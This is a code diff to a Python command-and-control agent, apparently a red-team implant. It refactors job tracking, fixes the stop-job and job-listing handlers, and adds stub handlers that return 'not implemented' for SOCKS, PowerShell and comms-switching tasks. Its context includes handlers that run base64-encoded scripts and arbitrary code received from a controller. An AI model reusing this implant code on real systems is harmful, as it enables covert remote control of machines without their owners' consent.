@@ -61,7 +61,7 @@ headersRaw = parts[2:]
 
 defaultResponse = base64.b64decode("")
 
-jobs = []
+jobs = {}
 moduleRepo = {}
 _meta_cache = {}
 
@@ -404,36 +404,36 @@ def process_packet(packetType, data, resultID):
 
         send_message(build_response_packet(43, result_data, resultID))
 
+    elif packetType == 44:
+        # run csharp module in ironpython using reflection
+        send_message(build_response_packet(60, "[!] C# module execution not implemented", resultID))
+
+
     elif packetType == 50:
         # return the currently running jobs
-        msg = ""
-        if len(jobs) == 0:
-            msg = "No active jobs"
-        else:
-            msg = "Active jobs:\n"
-            for x in range(len(jobs)):
-                msg += "\t%s" % (x)
+        msg = "Active jobs:\n"
+
+        for key in jobs:
+            msg += "Task %s" % key
         send_message(build_response_packet(50, msg, resultID))
 
     elif packetType == 51:
         # stop and remove a specified job if it's running
         try:
-            # Calling join first seems to hang
-            # result = jobs[int(data)].join()
-            send_message(
-                build_response_packet(0, "[*] Attempting to stop job thread", resultID)
-            )
-            result = jobs[int(data)].kill()
-            send_message(build_response_packet(0, "[*] Job thread stoped!", resultID))
-            jobs[int(data)]._Thread__stop()
+            jobs[int(data)].kill()
             jobs.pop(int(data))
-            if result and result != "":
-                send_message(build_response_packet(51, result, resultID))
-        except:
-            return build_response_packet(0, "error stopping job: %s" % (data), resultID)
+            send_message(build_response_packet(51, "[+] Job thread %s stopped successfully" % (data), resultID))
+        except Exception as e:
+            send_message(build_response_packet(51, "[!] Error stopping job thread: %s" % (e), resultID))
+
+    elif packetType == 60:
+        send_message(build_response_packet(60, "[!] SOCKS server not implemented", resultID))
+
+    elif packetType == 61:
+        send_message(build_response_packet(0, "[!] SOCKS server data not implemented", resultID))
 
     elif packetType == 100:
-        # dynamic code execution, wait for output, don't save outputPicl
+        # dynamic code execution, wait for output, don't save output
         try:
             buffer = StringIO()
             sys.stdout = buffer
@@ -541,6 +541,17 @@ def process_packet(packetType, data, resultID):
         # TODO: implement job structure
         pass
 
+    elif packetType == 112:
+        # powershell task
+        send_message(build_response_packet(60, "[!] PowerShell tasks not implemented", resultID))
+
+    elif packetType == 118:
+        # PowerShel Task - dynamic code execution, wait for output, don't save output
+        send_message(build_response_packet(60, "[!] PowerShell tasks not implemented", resultID))
+
+    elif packetType == 119:
+        pass
+
     elif packetType == 121:
         # base64 decode the script and execute
         script = base64.b64decode(data)
@@ -639,9 +650,17 @@ def process_packet(packetType, data, resultID):
                 )
             )
 
+    elif packetType == 130:
+        # Dynamically update agent comms
+        send_message(build_response_packet(60, "[!] Switch agent comms not implemented", resultID))
+
+    elif packetType == 131:
+        # Update the listener name variable
+        send_message(build_response_packet(60, "[!] Switch agent comms not implemented", resultID))
+
     else:
         send_message(
-            build_response_packet(0, "invalid tasking ID: %s" % (taskingID), resultID)
+            build_response_packet(0, "invalid tasking ID: %s" % (packetType), resultID)
         )
 
 
@@ -863,7 +882,7 @@ def agent_exit():
     if len(jobs) > 0:
         try:
             for x in jobs:
-                jobs[int(x)].kill()
+                jobs[x].kill()
                 jobs.pop(x)
         except:
             # die hard if thread kill fails
@@ -906,7 +925,7 @@ class KThread(threading.Thread):
     def start(self):
         """Start the thread."""
         self.__run_backup = self.run
-        self.run = self.__run  # Force the Thread toinstall our trace.
+        self.run = self.__run  # Force the Thread to install our trace.
         threading.Thread.start(self)
 
     def __run(self):
@@ -949,7 +968,7 @@ def start_job(code, resultID):
     codeThread = KThread(target=job_func, args=(resultID,))
     codeThread.start()
 
-    jobs.append(codeThread)
+    jobs[resultID] = codeThread
 
 
 def job_func(resultID):
